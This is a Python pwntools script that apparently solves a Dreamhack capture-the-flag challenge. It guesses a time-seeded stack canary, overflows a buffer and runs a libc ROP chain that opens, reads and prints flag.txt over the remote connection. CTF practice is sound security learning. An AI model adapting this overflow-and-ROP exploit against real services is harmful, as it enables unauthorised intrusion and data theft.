from pwn import *
import time
import random
context.arch = 'amd64'
context.log_level = 'debug'
io = remote('host3.dreamhack.games', 11696)
#io = remote('localhost', 20001)
libc = ELF("./deploy/lib/libc.so.6")
random.seed(int(time.time()))
canary = random.randbytes(16)[:8]
canary = bytearray(canary)
libc.base = 0x7fffb7ddb000

s_flag = libc.base + 0x00000000001ed7a0 + 0x800
addr_flag = libc.base + 0x00000000001ed7a0 + 0x800
pop_rdi_ret = libc.base + 0x0000000000023b6a
pop_rsi_ret = libc.base + 0x000000000002601f
pop_rdx_rbx_ret = libc.base + 0x000000000015fae6
canary[0] = 0x00
canary = int.from_bytes(canary, byteorder='little')
print(hex(canary))
payload = b'a'*0x108 + p64(canary) + b'c'*0x8
payload += flat([
    pop_rdi_ret, 0x0,
    pop_rsi_ret, s_flag,
    pop_rdx_rbx_ret, 0x10, 0x00,
    libc.base + libc.symbols['read'],

    pop_rsi_ret, 0,
    pop_rdi_ret, s_flag,
    libc.base + libc.symbols['open'],

     # read(3, addr, 0x100);
    pop_rdx_rbx_ret, 0x100, 0x0,
    pop_rsi_ret, addr_flag,
    pop_rdi_ret, 3,
    libc.base + libc.symbols["read"],

    # write(1, addr, 0x100);
    pop_rdx_rbx_ret, 0x100, 0x0,
    pop_rsi_ret, addr_flag,
    pop_rdi_ret, 1,
    libc.base + libc.symbols["write"],
])

io.sendline(payload)
sleep(1)
io.send('flag.txt\x00')
io.interactive()
